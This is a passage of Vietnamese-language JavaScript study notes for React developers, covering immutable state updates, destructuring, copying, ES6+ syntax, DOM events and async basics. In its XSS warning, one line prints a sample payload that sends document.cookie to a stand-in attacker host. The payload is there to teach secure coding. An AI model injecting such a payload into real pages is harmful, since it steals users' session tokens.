  - Các hàm mutate (`push`, `pop`, `splice`, `sort`, `reverse`) sửa trực tiếp dữ liệu bên trong nhưng **GIỮ NGUYÊN ĐỊA CHỈ Ô NHỚ CŨ**. Do đó `oldState === newState` luôn là `true` -> React bị "lừa" là không có gì mới và **TỪ CHỐI RE-RENDER (Giao diện bị đóng băng/đơ)**!
- **Giải pháp sống còn:** Luôn dùng các phương thức tạo ra **ĐỊA CHỈ Ô NHỚ MỚI TOANH (New Reference)** theo 3 công thức:
  1. **THÊM phần tử (Dùng Spread `...`):**
     `const newCart = [...cart, newItem];`
  2. **XÓA phần tử (Dùng `.filter()`):**
     `const newCart = cart.filter(item => item.id !== deleteId);`
  3. **SỬA phần tử (Dùng `.map()`):**
     `const newCart = cart.map(item => item.id === targetId ? { ...item, quantity: item.quantity + 1 } : item);`
  *(Công thức sửa bằng `map` tạo ra mảng mới và object mới cho riêng phần tử cần sửa, ép React thấy địa chỉ ô nhớ mới để re-render chính xác và tối ưu nhất).*

---
---

## MỤC 5: OBJECT VÀ IMMUTABLE (NỀN TẢNG CỐT LÕI CỦA STATE MANAGEMENT)

### 1. Truy cập, thêm, sửa, xóa thuộc tính (Dot notation vs Bracket notation `obj[key]`):
- **Dot notation (`obj.key` - Dấu chấm tĩnh):**
  - *Cơ chế:* JS Engine tìm **đích danh** thuộc tính có tên là chữ `key` nằm trên Object.
  - *Hạn chế:* Hoàn toàn bất lực trước các thuộc tính có chứa ký tự đặc biệt, dấu gạch nối, khoảng trắng (`obj["first-name"]` - nếu viết `obj.first-name` JS sẽ hiểu nhầm là phép trừ toán học!), hoặc thuộc tính bắt đầu bằng chữ số (`obj[0]`).
  - *Bẫy lú lẫn:* `const field = "name"; user.field;` -> JS đi tìm chữ `field` trên object chứ không thèm đọc giá trị `"name"` của biến, kết quả trả về `undefined`!
- **Bracket notation (`obj[key]` - Ngoặc vuông động / Computed Property):**
  - *Cơ chế:* Bên trong cặp ngoặc vuông `[...]` là một **biểu thức (Expression)**. JS Engine bắt buộc phải tính toán, giải phóng giá trị của biểu thức đó trước rồi mới dùng giá trị đó làm tên thuộc tính để truy cập.
  - *Ví dụ:* `user[field]` -> giải phóng `field` thành `"name"` -> truy cập `user["name"]` ra đúng giá trị.
  - *Kết nối sống còn trong React Form:* Khi viết một hàm duy nhất để hứng dữ liệu từ nhiều ô `input` khác nhau, bắt buộc phải dùng ngoặc vuông để tạo Computed Property Name:
    ```javascript
    const handleChange = (e) => {
      setUser({
        ...user,
        [e.target.name]: e.target.value // Tính toán giá trị của ô input (ví dụ "email", "password") làm key!
      });
    };
    ```
- **Thêm / Sửa / Xóa thuộc tính chuẩn Bất biến (Immutable):**
  - *Thêm / Sửa:* Dùng Spread `{ ...user, age: 26, isVip: true }`.
  - *Xóa:* **TUYỆT ĐỐI CẤM** dùng `delete user.password` (vì `delete` xẻo trực tiếp ô nhớ gốc, làm React bị "mù" không nhận ra sự thay đổi để re-render, đồng thời làm mất dữ liệu gốc không thể Undo/Redo).
  - 👉 Thay vào đó, dùng Rest Operator để xóa bất biến:
    ```javascript
    const { password, ...safeUser } = user; // safeUser là object mới đã loại bỏ sạch password!
    ```

---

### 2. Destructuring Object (Bóc tách dữ liệu):
- **Quy tắc vàng phân biệt Vế Trái vs Vế Phải dấu bằng (`=`):**
  - Nếu `{ ... }` nằm ở **VẾ PHẢI**: Là **ĐÓNG GÓI** (Tạo ra Object mới).
  - Nếu `{ ... }` nằm ở **VẾ TRÁI** (sau `const/let`): Là **MỞ HỘP / BÓC TÁCH** (Thò tay vào xé toạc object bên phải để móc các biến bên trong ra dùng độc lập).
- **Cú pháp đổi tên biến (`tên_thuộc_tính_gốc : tên_biến_mới`):**
  - *Ví dụ:* `const { first_name: userName } = apiResponse;`
  - *Bản chất:* Tìm thuộc tính `first_name` từ API, lấy giá trị của nó gán vào một biến mới trong bộ nhớ là `userName`. Trong bộ nhớ **chỉ tồn tại biến `userName`**, biến `first_name` hoàn toàn không tồn tại bên ngoài (gọi ra sẽ bị `ReferenceError`).
- **Bẫy giá trị mặc định (Default Values):**
  - Cú pháp: `const { role = "guest" } = user;`
  - *Cơ chế V8:* Giá trị mặc định **CHỈ ĐƯỢC KÍCH HOẠT KHI THUỘC TÍNH ĐÓ LÀ `undefined`** (hoặc không tồn tại trên object).
  - *Bẫy Senior:* Nếu Backend trả về `role: null` -> JS coi `null` là một giá trị hợp lệ đã tồn tại (`null !== undefined`), nên nó **bỏ qua giá trị mặc định** và giữ nguyên `null`!
- **Bẫy sập nguồn App với Nested Destructuring (`{ profile: { avatar } }`):**
  - *Cơ chế:* Cú pháp này giống như biển chỉ đường: "Vào trong `profile`, rồi mở hộp lấy `avatar`". Chỉ có duy nhất biến `avatar` được sinh ra, không có biến `profile`.
  - *Thảm họa:* Nếu Backend trả về `profile: null` hoặc `profile: undefined`, JS cố gắng mở hộp của `null` (tương đương chạy `null.avatar`) -> **Sập app ngay lập tức:** `TypeError: Cannot read properties of null (reading 'avatar')`.
  - 👉 **Giải pháp chuẩn Senior từ ES2020:** Không viết lồng nhau nguy hiểm, thay vào đó dùng **Optional Chaining (`?.`)** kết hợp **Nullish Coalescing (`??`)**:
    ```javascript
    const avatar = userResponse.profile?.avatar ?? "default-avatar.png";
    ```
    *(Dấu `?.` đóng vai trò vệ sĩ: thấy `null` hoặc `undefined` là dừng lại ngay không đọc tiếp, trả về `undefined` an toàn tuyệt đối không bao giờ làm sập app!)*

---

### 3. Spread (`...`) và Rest Parameter trong Object:
- **Phân biệt rạch ròi bản chất:**
  - **Spread (Bung ra - Vế PHẢI dấu `=`):** Trải phẳng toàn bộ các cặp key-value của object cũ vào một object mới:
    `const clone = { ...original };`
  - **Rest (Gom lại - Vế TRÁI dấu `=`):** Gom toàn bộ các thuộc tính **còn lại** chưa được bóc tách riêng lẻ để đóng gói vào một object mới:
    `const { id, token, ...userData } = response;`
- **Ứng dụng đỉnh cao trong React Props:**
  Khi một component nhận rất nhiều Props nhưng bạn chỉ cần can thiệp một vài cái, còn lại truyền thẳng xuống thẻ HTML bên dưới:
  ```javascript
  const CustomButton = ({ title, variant, ...restProps }) => {
    return <button className={variant} {...restProps}>{title}</button>;
  };
  ```

---

### 4. Phân biệt Shallow Copy (Sao chép nông) vs Deep Copy (Sao chép sâu):
- **Bản chất ô nhớ Heap:**
  - Biến chứa Object trong JS không chứa ruột dữ liệu, mà chỉ chứa **địa chỉ con trỏ (Reference Address)** trỏ tới vùng nhớ trên Heap.
  - Các thuộc tính bên trong nếu là Object con thì nó cũng chỉ lưu địa chỉ trỏ sang ô nhớ của Object con đó.
- **Shallow Copy (`{ ...user }`, `Object.assign({}, user)`):**
  - Chỉ tạo ra "chiếc vỏ mới" cho **Level 1 (tầng ngoài cùng)**.
  - Các Object/Array con lồng bên trong (Level 2, Level 3...) **vẫn bị copy nguyên xi địa chỉ ô nhớ cũ**!
  - *Hậu quả:* Hai biến khác nhau nhưng các object con bên trong **dùng chung một ô nhớ**. Khi bạn sửa `updatedUser.settings.theme = "dark"`, thằng `originalUser.settings.theme` cũng bị biến đổi theo!
- **Deep Copy (Nhân bản sâu toàn diện):**
  - Cắt đứt hoàn toàn quan hệ: Đệ quy nhân bản sâu 100% tất cả các tầng, cấp phát vùng nhớ mới toanh cho từng object con.
  - *Vũ khí hiện đại Native của JS:* `structuredClone(user)`.
  - *Bẫy cổ xưa:* `JSON.parse(JSON.stringify(user))` -> **CỰC KỲ NGUY HIỂM** vì nó nuốt chửng các giá trị `undefined`, hàm `function`, `Date` bị biến thành chuỗi, `NaN` bị biến thành `null`, và lỗi sập app nếu có tham chiếu vòng (Circular Reference).

---

### 5. Nguyên tắc Immutability & Tại sao cấm lạm dụng `structuredClone` trong React:
- **Quy tắc vàng của React:** State là Bất Biến (Immutable). React dùng thuật toán so sánh nông (`oldState === newState`).
  - Nếu mutate trực tiếp: Địa chỉ ô nhớ không đổi -> React coi như không có gì thay đổi -> **Từ chối re-render**.
  - Phải luôn tạo ô nhớ mới để React phát hiện sự thay đổi và kích hoạt Render Pipeline.
- **Nghịch lý `structuredClone` trong React:** 
  *"Tiện thế, sao không dùng `structuredClone` cho tất cả mọi State?"* 👉 **CẤM LẠM DỤNG VÌ 3 LÝ DO:**
  1. **Phá nát cơ chế tối ưu của `React.memo`:**
     - Giả sử `user` có: `profile`, `orders`, `settings`. Bạn chỉ muốn đổi mỗi `settings.theme`.
     - Nếu dùng `structuredClone`, nó đẻ ra ô nhớ mới cho CẢ `profile` và `orders`.
     - Các Component con `<Profile />` và `<OrderList />` thấy địa chỉ prop bị đổi liền **re-render lại toàn bộ màn hình một cách vô ích**, làm app bị lag giật kinh hoàng!
  2. **Không hỗ trợ Function:** Nếu trong object có method hoặc callback handler, `structuredClone` quẳng lỗi `DOMException: DataCloneError` làm sập app ngay.
  3. **Tốn CPU / RAM:** Phải duyệt đệ quy toàn bộ cây dữ liệu lớn, tốn tài nguyên gấp hàng chục lần Spread.
- 👉 **Khái niệm Structural Sharing (Chia sẻ cấu trúc):** 
  React sinh ra để hoạt động theo nguyên lý này: Chỉ đẻ ô nhớ mới cho nhánh nào có dữ liệu bị thay đổi, còn các nhánh con khác không đổi thì **bắt buộc phải giữ nguyên địa chỉ ô nhớ cũ** để Component con không bị render thừa!

---

### 6. Cách xử lý cập nhật Object lồng nhau (Nested Object Update):
- **Cú pháp chuẩn cơm mẹ nấu trong React (Nested Spread):**
  Muốn sửa tầng con nào thì tự tay tạo "chiếc vỏ mới" cho tầng con đó:
  ```javascript
  const updatedUser = {
    ...user,                 // Giữ nguyên các nhánh khác của tầng 1
    settings: {
      ...user.settings,      // Tạo ô nhớ mới cho settings, giữ nguyên notifications...
      theme: "dark"          // Ghi đè thuộc tính cần sửa
    }
  };
  ```
- **Khi Object lồng quá sâu (3 - 4 tầng):**
  - Không ai viết 4 tầng `...` vì rất dễ sót thuộc tính và hoa mắt.
  - Trong thực tế công việc, các thư viện quản lý State chuyên nghiệp (như **Redux Toolkit**) tích hợp sẵn thư viện **Immer.js**.
  - Immer sử dụng `Proxy` của JavaScript để cho phép ta viết code tự nhiên như sửa trực tiếp nhưng phía sau nó tự động sinh ra object immutable chuẩn Structural Sharing:
    ```javascript
    // Cú pháp Immer (dùng trong Redux Toolkit / hook useImmer):
    updateUser(draft => {
      draft.settings.theme = "dark"; // An toàn 100%, không mutate gốc!
    });
    ```

---
---

## MỤC 6: CÚ PHÁP ES6+ DÙNG NHIỀU TRONG REACT (TỔNG HỢP & NÂNG CAO)

### 1. Template Literal (String nội suy với Backtick ` `):
- **Cú pháp:** Đặt chuỗi trong cặp dấu huyền (Backtick), nhúng biểu thức JS vào `${expression}`.
- **Tại sao tẩy chay phép cộng chuỗi `+` truyền thống:**
  - *Bẫy ép kiểu quái dị:* `"Tổng tiền: " + 10 + 20` -> JS cộng chuỗi từ trái qua phải, biến số 20 thành chuỗi và in ra `"Tổng tiền: 1020"` (sai lệch giá tiền)!
  - *Với Template Literal:* `` `Tổng tiền: ${10 + 20}k` `` -> Biểu thức bên trong `${}` luôn được tính toán toán học trước, trả về `"Tổng tiền: 30k"` chính xác 100%.
- **Hỗ trợ xuống dòng tự nhiên (Multiline):** Viết chuỗi HTML / SVG nhiều dòng mà không cần chèn ký tự `\n` hoặc nối dấu `+` xấu xí.

---

### 2. Destructuring (So sánh Array Destructuring vs Object Destructuring):
- **Array Destructuring (Dựa trên VỊ TRÍ INDEX):**
  - *Cơ chế:* Không quan tâm tên biến là gì, chỉ gán theo thứ tự xuất hiện: `const [first, second] = arr;`.
  - *Bí mật thiết kế React `useState`:*
    Tại sao `useState` trả về Mảng `[state, setState]` mà không trả về Object `{ state, setState }`?
    - Nếu trả về Object: Mỗi lần gọi `useState` sẽ bị trùng tên biến `state` và `setState`, lập tức ném lỗi `SyntaxError: Identifier has already been declared`. Dev bắt buộc phải gõ cú pháp đổi tên cồng kềnh `const { state: count, setState: setCount } = useState(0)`.
    - Trả về Mảng: Cho phép lập trình viên **toàn quyền tự do đặt bất kỳ tên biến nào** mà không sợ trùng: `const [count, setCount] = useState(0); const [name, setName] = useState("");`.
- **Object Destructuring (Dựa trên TÊN THUỘC TÍNH - KEY NAME):**
  - Dùng khi hàm/thư viện trả về **nhiều thuộc tính (5 - 10 cái)** (như `useQuery` trong React Query: `{ data, isLoading, refetch }`). Người dùng muốn lấy món nào thì bóc trực tiếp món đó ra, không cần phải đếm thứ tự dấu phẩy như mảng.

---

### 3. Toán tử Spread (`...`) và Rest Parameter (`...`):
- **Spread (Bung ra - vế phải dấu `=` hoặc trong đối số gọi hàm):**
  - Trải phẳng mảng hoặc object để nhân bản nông (Shallow copy) hoặc gộp dữ liệu: `const clone = { ...original };`.
- **Rest (Gom lại - vế trái dấu `=` hoặc trong tham số khai báo hàm):**
  - Gom toàn bộ các phần tử / thuộc tính còn lại chưa được bóc tách vào một biến mới: `const { id, ...rest } = user;`.
  - Ứng dụng xóa thuộc tính nhạy cảm theo cách bất biến trong React State (thay thế lệnh `delete` độc hại).

---

### 4. Arrow Function (Hàm mũi tên trong React):
- Cú pháp ngắn gọn, tự động return biểu thức: `const double = x => x * 2;`.
- **Không có `this` riêng (Lexical this):** Không sợ bị mất ngữ cảnh `this` khi truyền làm callback sự kiện `onClick={() => handleClick()}`.
- Lưu ý: Không dùng làm Constructor (`new`), không có đối tượng `arguments`.

---

### 5. Giá trị mặc định (Default Parameters):
- Cú pháp: `function fetchProducts(page = 1, limit = 10) {}` hoặc khi destructuring: `const { role = "guest" } = user;`.
- **Bẫy sống còn:** Chỉ được kích hoạt khi đối số truyền vào là `undefined` hoặc bỏ trống. Nếu truyền `null`, nó **VẪN GIỮ NGUYÊN `null`** chứ không kích hoạt giá trị mặc định!

---

### 6. Optional Chaining (`?.` - Dấu chấm an toàn):
- **Cơ chế:** Vệ sĩ kiểm tra phía trước có bị "rỗng" (`null` hoặc `undefined`) hay không.
- *Ví dụ:* `user.profile?.avatar`.
- *Ngăn chặn sập nguồn App:* Nếu `profile` là `null`, nó lập tức dừng lại và trả về `undefined`, không thèm đọc tiếp `.avatar`. Triệt tiêu hoàn toàn lỗi huyền thoại làm trắng màn hình: `TypeError: Cannot read properties of null/undefined`.

---

### 7. Nullish Coalescing (`??`) so sánh với Toán tử OR (`||`):
- **Toán tử OR (`||`):**
  - Coi tất cả 6 giá trị Falsy (`false`, `0`, `""`, `null`, `undefined`, `NaN`) là rác và bỏ qua để lấy vế phải.
  - *Bẫy thảm họa giỏ hàng / số dư tài khoản:* `balance || 100000`. Khi số dư thực tế của khách là `0đ`, `||` coi `0` là falsy và biến số dư thành `100000đ` (hiển thị sai dữ liệu nghiêm trọng)!
- **Toán tử Nullish Coalescing (`??`):**
  - **CHỈ COI ĐÚNG 2 GIÁ TRỊ** là "vô giá trị": **`null`** và **`undefined`**.
  - `0 ?? 100000` -> Giữ nguyên số `0`!
  - `"" ?? "Mặc định"` -> Giữ nguyên chuỗi rỗng `""`!
  - 👉 **Quy tắc React:** Luôn dùng `??` để đặt giá trị dự phòng cho số (number) và chuỗi (string) từ API.

---

### 8. Property Shorthand (Viết tắt thuộc tính Object):
- Khi tên biến trùng với tên Key của Object, không cần gõ lặp lại `key: key`.
- Thay vì: `const user = { name: name, age: age };`
- Ta viết: `const user = { name, age };`
- Giúp gom nhanh các State để gửi lên Backend API trong các hàm Submit Form.

---

### 9. Dynamic Property Key (Computed Property Name `[key]`):
- Dùng cặp ngoặc vuông `[...]` để nhúng một biến hoặc biểu thức làm tên thuộc tính của Object:
  ```javascript
  const field = "email";
  const formData = {
    [field]: "user@example.com"
  };
  ```
- Là kỹ thuật duy nhất để viết một hàm xử lý State cho hàng loạt ô input Form trong React: `setUser({ ...user, [e.target.name]: e.target.value })`.

---

### 10. ES Modules (`import` / `export`) so sánh với Classic Script (`<script>`):
- **Tại sao Classic Script (`<script src="...">` truyền thống) bị khai tử trong dự án lớn?**
  1. *Ô nhiễm toàn cục (Global Scope Pollution):* Mọi biến/hàm đều bị ném thẳng lên đối tượng toàn cục `window`. Hai file khác nhau đặt trùng tên biến `let user` sẽ gây đụng độ làm sập web ngay lập tức!
  2. *Cực hình về thứ tự nạp thẻ (Dependency Hell):* File B dùng code của File A thì thẻ script của File A **bắt buộc phải đặt trước** File B trong HTML. Dự án 50 file đảo lộn 1 dòng là crash web!
  3. *Không rõ nguồn gốc:* Đọc 1 hàm trong code không thể biết nó chui ra từ file script nào trong số hàng chục thẻ script.
- **Bản chất ưu việt của ES Modules (`import` / `export`):**
  - Mỗi file là một **Module Scope độc lập (Căn phòng kín)**, cô lập hoàn toàn, không đụng chạm `window`.
  - Tự động giải quyết cây phụ thuộc (Dependency Graph), không quan tâm thứ tự nạp thẻ.
- **Phân biệt Named Export vs Default Export:**
  - **Named Export (`export const Button = ...`):**
    - File có thể xuất nhiều thứ.
    - Bên nhận **BẮT BUỘC dùng ngoặc nhọn `{ Button }`** và **phải gõ đúng tên**.
    - Hỗ trợ tối ưu **Tree-shaking** (chỉ tải hàm nào được dùng, vứt bỏ code thừa giúp web tải cực nhanh).
  - **Default Export (`export default App`):**
    - Mỗi file chỉ có **DUY NHẤT 1** default export.
    - Bên nhận **KHÔNG DÙNG ngoặc nhọn `import App from './App'`** và có thể **tự do đặt tên khác**.

---
---

## MỤC 7: DOM VÀ SỰ KIỆN (CỘI NGUỒN CỦA VIRTUAL DOM & SYNTHETIC EVENT)

### 1. DOM Tree là gì (Bản chất C++ trong Browser Engine):
- **Khái niệm:** Document Object Model (DOM) là cây đối tượng phân cấp trong bộ nhớ RAM mà Browser Engine (như Blink/Webkit) dựng nên từ file mã nguồn HTML thô. Mỗi thẻ HTML, đoạn văn bản, thuộc tính đều trở thành một Node (Document Node, Element Node, Text Node).
- **Tại sao thao tác Real DOM lại đắt đỏ (Slow DOM):**
  - Mỗi khi JavaScript thay đổi một phần tử trên DOM thật, trình duyệt phải kích hoạt lại toàn bộ chu trình xử lý đồ họa:
    1. *Reflow (Layout):* Tính toán lại tọa độ hình học, chiều rộng, chiều cao của phần tử và toàn bộ các phần tử xung quanh.
    2. *Repaint:* Quét lại màu sắc, bóng đổ và vẽ lại từng pixel lên màn hình GPU.
  - Nếu thay đổi liên tục 100 lần trong vòng lặp, trình duyệt sẽ bị giật khựng (Drop FPS).
- 👉 **Cội nguồn ra đời của React Virtual DOM:** React sinh ra Virtual DOM (một bản sao DOM dạng JavaScript Object siêu nhẹ nằm trên RAM) để gom tất cả các thay đổi lại, dùng thuật toán Diffing so sánh bản cũ và bản mới, rồi mới cập nhật một lần duy nhất (Batching) lên DOM thật nhằm tối ưu hiệu năng.

---

### 2. Chọn và cập nhật phần tử (`querySelector`, `innerHTML`, `textContent`):
- **`document.querySelector(selector)` / `querySelectorAll`:** Tìm phần tử bằng cú pháp CSS Selector (`.class`, `#id`, `div > p`).
- **Phân biệt `textContent` vs `innerHTML`:**
  - **`textContent` (An toàn 100%):** Chỉ đọc hoặc ghi văn bản thuần túy (Plain text). Nếu truyền chuỗi chứa thẻ HTML `<p>`, nó in nguyên xi chữ `<p>` ra màn hình mà không phân tích cú pháp. Hiệu năng cực cao và không bao giờ bị hack.
  - **`innerHTML` (Nguy cơ bảo mật):** Bắt Browser Engine phải bật bộ phân tích cú pháp (HTML Parser) để biến chuỗi thành các thẻ DOM thật.
- 💥 **Bẫy bảo mật XSS (Cross-Site Scripting):** 
  Nếu bạn dùng `innerHTML` để hiển thị nội dung người dùng nhập (như bình luận): Hacker có thể nhập mã độc: `<img src="loi" onerror="fetch('https://hacker.com?cookie=' + document.cookie)">`. Trình duyệt tải ảnh lỗi sẽ lập tức chạy lệnh ăn cắp token/cookie của người dùng!
  - *Kết nối React:* React mặc định luôn coi dữ liệu là `textContent` an toàn để chống XSS. Nếu lập trình viên bắt buộc phải chèn HTML thô, React ép phải dùng một thuộc tính có tên cảnh báo: `dangerouslySetInnerHTML={{ __html: rawHtml }}`.

---

### 3. `addEventListener` và cơ chế dọn dẹp listener (`removeEventListener`):
- **Bản chất ô nhớ Function:** Trong JS, mỗi khi bạn viết hàm mũi tên `() => {}`, V8 Engine luôn cấp phát một vùng nhớ mới trên Heap.
- 💥 **Thảm họa rò rỉ bộ nhớ (Memory Leak):**
  ```javascript
  // Dòng này tạo hàm ở ô nhớ 0x001:
  window.addEventListener("scroll", () => console.log("Cuộn trang"));

  // Dòng này tạo hàm MỚI ở ô nhớ 0x002 -> KHÔNG XÓA ĐƯỢC 0x001!
  window.removeEventListener("scroll", () => console.log("Cuộn trang"));
  ```
  Trình duyệt không tìm thấy ô nhớ `0x002` trong danh sách đăng ký nên bỏ qua. Hàm `0x001` tiếp tục bám chặt vào trình duyệt chạy ngầm vĩnh viễn, ngốn sạch RAM!
- 👉 **Quy tắc Senior:** Bất kỳ sự kiện nào có nguy cơ phải gỡ bỏ (nhất là gắn trên `window`, `document`: `scroll`, `resize`, `keydown`), bắt buộc phải tách hàm ra một biến có tên rõ ràng để giữ nguyên địa chỉ ô nhớ:
  ```javascript
  const handleScroll = () => console.log("Cuộn trang");
  window.addEventListener("scroll", handleScroll); // Gắn 0x001
  window.removeEventListener("scroll", handleScroll); // Gỡ đúng 0x001!
  ```
- *Kết nối React Hook `useEffect`:* Đây chính là nguồn gốc của **Cleanup Function**:
  ```javascript
  useEffect(() => {
    const handleResize = () => setWidth(window.innerWidth);
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize); // Dọn dẹp khi unmount!
  }, []);
  ```

---

### 4. Event Object (`e` / `event`):
- Là đối tượng sự kiện được trình duyệt tự động khởi tạo và truyền vào làm tham số đầu tiên của hàm callback mỗi khi có hành động tương tác.
- Chứa toàn bộ ngữ cảnh của sự kiện: tọa độ chuột (`e.clientX`, `e.clientY`), phím bấm (`e.key`), loại sự kiện (`e.type`), và các phương thức can thiệp dòng chảy sự kiện (`e.preventDefault()`, `e.stopPropagation()`).

---

### 5. Phân biệt `e.target` vs `e.currentTarget` & So sánh `id` vs `data-id`:
- **`e.target` (Nơi phát sinh cú click):**
  - Là phần tử con cụ thể mà ngón tay người dùng / con trỏ chuột thực sự bấm trúng.
  - Bấm trúng icon thùng rác `<i>` -> `e.target` là thẻ `<i>`.
  - Bấm trúng chữ `<span>` -> `e.target` là thẻ `<span>`.
- **`e.currentTarget` (Nơi gắn móc treo sự kiện):**
  - Là phần tử mà bạn dùng `addEventListener` để lắng nghe (ví dụ thẻ `<button class="btn-delete">`).
  - Dù người dùng click trúng `<i>` hay `<span>` bên trong, `e.currentTarget` **LUÔN LUÔN là thẻ `<button>`**!
  - 👉 Để đọc dữ liệu `dataset.id` chuẩn xác không bị `undefined`, luôn luôn dùng `e.currentTarget.dataset.id`!
- **So sánh bản chất: `id` vs `data-id` (`data-*`):**
  - **`id` (Căn cước công dân của thẻ - Dành cho Trình duyệt):**
    - Quy chuẩn W3C: Bắt buộc phải **DUY NHẤT** trên toàn trang.
    - Dùng cho: Khung sườn lớn (`#root`, `#app`), liên kết nhãn Form `<label for="email">`, neo cuộn trang Anchor `<a href="#contact">`.
    - Cấm dùng lưu ID sản phẩm/bài viết vì trong danh sách nhiều thẻ sẽ bị trùng `id`, làm hỏng cú pháp CSS và `getElementById`.
  - **`data-id` / `data-*` (Túi đựng dữ liệu nghiệp vụ - Dành cho Lập trình viên):**
    - Cho phép thoải mái trùng lặp (nhiều phần tử cùng mang `data-category="phone"` hoặc `data-id="99"`).
    - Được trình duyệt tự động gom vào object `element.dataset` (tên gạch nối tự đổi thành camelCase: `data-product-price` -> `dataset.productPrice`).

---

### 6. `e.preventDefault()` và `e.stopPropagation()`:
- **`e.preventDefault()` (Chặn hành vi mặc định của Browser):**
  - Ngăn hành vi mặc định của trình duyệt: thẻ `<form>` tự reload trang và gửi query lên URL khi submit, thẻ `<a>` nhảy link.
  - Trong React (Single Page Application): Bắt buộc phải gọi `e.preventDefault()` đầu tiên trong hàm submit form để tránh trình duyệt reload làm xóa sạch toàn bộ State trong RAM.
- **`e.stopPropagation()` (Chặn nổi bọt sự kiện):**
  - Ngăn chặn không cho sự kiện lan truyền ngược lên các thẻ cha tổ tiên.
  - 💥 **Tại sao Senior hạn chế dùng `stopPropagation()`:**
    1. *Bóp chết các công cụ Tracking & Analytics (Google Tag Manager, Hotjar, GA4):* Các công cụ này treo listener ở `window/document` để ghi nhận hành vi người dùng. Nếu bạn chặn bọt, công cụ đo lường sẽ bị "mù", không ghi nhận được lượt click!
    2. *Phá vỡ Event Delegation:* Các sự kiện ở thẻ cha sẽ bị tê liệt không nhận được tín hiệu.
  - 💡 **Mẹo đóng Modal an toàn không cần `stopPropagation()`:**
    Ở thẻ nền mờ (`backdrop`), kiểm tra:
    ```javascript
    backdrop.addEventListener("click", (e) => {
      // Chỉ đóng khi người dùng click TRÚNG CHÍNH NỀN MỜ (không phải do nổi bọt từ ruột modal lên):
      if (e.target === e.currentTarget) {
        closeModal();
      }
    });
    ```

---

### 7. Event Bubbling (Nổi bọt) & Kỹ thuật đỉnh cao Event Delegation (Ủy quyền sự kiện):
- **Cơ chế Nổi bọt (Event Bubbling):** Khi một sự kiện xảy ra ở thẻ con, nó sẽ tự động kích hoạt lần lượt lên tất cả các thẻ cha bọc ngoài nó theo chiều từ dưới lên trên (`target` -> cha -> ông -> `body` -> `html` -> `document` -> `window`).
- **Kỹ thuật Event Delegation (Ủy quyền sự kiện):**
  - *Bài toán:* Danh sách có 1000 thẻ `<li>` sản phẩm. Nếu dùng vòng lặp gắn 1000 listener sẽ gây tốn RAM và làm chậm web. Hơn nữa khi thêm sản phẩm mới bằng JavaScript, các thẻ mới sẽ không có sự kiện click!
  - *Giải pháp Senior:* **Gắn ĐÚNG 1 listener duy nhất lên thẻ cha `<ul>`**! Nhờ cơ chế nổi bọt, khi bấm vào bất kỳ thẻ `<li>` nào, sự kiện đều nổi lên thẻ cha `<ul>`. Thẻ cha chỉ cần kiểm tra:
    ```javascript
    document.querySelector("#product-list").addEventListener("click", (e) => {
      const item = e.target.closest("li"); // Tìm thẻ li gần nhất bị click
      if (item) {
        console.log("Xử lý sản phẩm ID:", item.dataset.id);
      }
    });
    ```
  - *Ưu điểm:* Cực nhẹ bộ nhớ (1 listener thay vì 1000), tự động nhận diện cả các phần tử mới được thêm vào sau này mà không cần gắn lại listener.
  - *Kết nối React:* Toàn bộ hệ thống sự kiện trong React (**SyntheticEvent**) không hề gắn trực tiếp vào các thẻ DOM con, mà nó dùng Event Delegation gắn tập trung toàn bộ ở gốc Root (`#root`) của ứng dụng!

---

### 8. Xử lý Form Submit & Đọc ràng buộc giá trị Input:
- **Xử lý Submit Form:**
  - Luôn lắng nghe sự kiện `submit` trên thẻ `<form>` (thay vì lắng nghe sự kiện `click` trên nút Button) để hỗ trợ cả người dùng bấm phím `Enter` khi đang ở trong ô input.
  - Luôn gọi `e.preventDefault()` đầu tiên.
  - Đọc dữ liệu nhanh qua `new FormData(formElement)` hoặc `e.target.elements`.
- **Đọc và ràng buộc Input:**
  - Sự kiện `input`: Kích hoạt ngay lập tức tại thời điểm người dùng gõ từng ký tự.
  - Sự kiện `change`: Chỉ kích hoạt khi người dùng gõ xong và con trỏ chuột bấm ra ngoài (blur).
  - *Cội nguồn của Controlled Component trong React:* 
    Ràng buộc giá trị hiển thị của thẻ `<input>` với State của React (`value={name}`), và mỗi khi người dùng gõ phím thì cập nhật lại State qua sự kiện `onChange={(e) => setName(e.target.value)}`. Dữ liệu một chiều (One-way Data Binding) kiểm soát tuyệt đối 100% những gì người dùng được phép nhập.

---
---

## MỤC 8: BẤT ĐỒNG BỘ (ASYNCHRONOUS JAVASCRIPT - TRÁI TIM KẾT NỐI API & REACT DATA)

### 1. Bản chất Single-Thread của V8 vs Hệ thống Đa luồng của Trình duyệt (Browser Web APIs):
- **JavaScript Engine (V8) chỉ có 1 luồng (Single-thread):** Chịu trách nhiệm thực thi các dòng lệnh JS (tính toán, gán biến, chạy vòng lặp) trên Call Stack.
- **Trình duyệt (Browser / Node Runtime) là hệ thống ĐA LUỒNG C++ (Multi-threaded):** Có các luồng ngầm chuyên trách: Network Threads (tải mạng), Timer Threads (bấm giờ), I/O Threads (đọc đĩa), GPU Threads (vẽ màn hình).
- **Cơ chế phối hợp Bất đồng bộ (Non-blocking):**
  - Khi gặp `fetch()` hoặc `setTimeout()`, luồng chính JS chỉ mất 0.001 mili-giây để **giao việc sang cho các luồng C++ của Trình duyệt**.
  - Luồng chính JS lập tức rảnh tay quay lại xử lý giao diện người dùng (click chuột, cuộn trang, gõ phím mượt mà 60 FPS).
  - Khi tác vụ ngầm hoàn tất, Trình duyệt đẩy kết quả vào Hàng đợi (Queue). Khi Call Stack rỗng, Event Loop sẽ bốc kết quả lên cho JS xử lý tiếp.

---

### 2. Callback cơ bản và Cơn ác mộng Callback Hell:
- **Bản chất của Callback trong bất đồng bộ:** Tự thân hàm Callback không phải là bất đồng bộ (ví dụ `arr.map(fn)` chạy đồng bộ 100%). Nó chỉ đóng vai trò là "phương tiện giao liên / số điện thoại để lại" để Trình duyệt gọi lại khi làm xong việc ngầm.
- **Callback Hell (Kim tự tháp địa ngục):**
  - Khi các tác vụ bất đồng bộ nối tiếp nhau (Đun nước -> Pha cà phê -> Bỏ đường -> Uống), các hàm callback lồng sâu vào nhau thụt lùi thành tam giác quái vật `})})})`.
  - Hậu quả: Code cực kỳ khó đọc, bắt lỗi phân tán rối rắm, và dính bẫy Inversion of Control (mất quyền kiểm soát số lần gọi hàm callback).

---

### 3. Promise và 3 trạng thái bất biến:
- **Khái niệm:** Promise là đối tượng đại diện cho một giá trị sẽ có trong tương lai (Chiếc thẻ rung trà sữa).
- **3 Trạng thái duy nhất:**
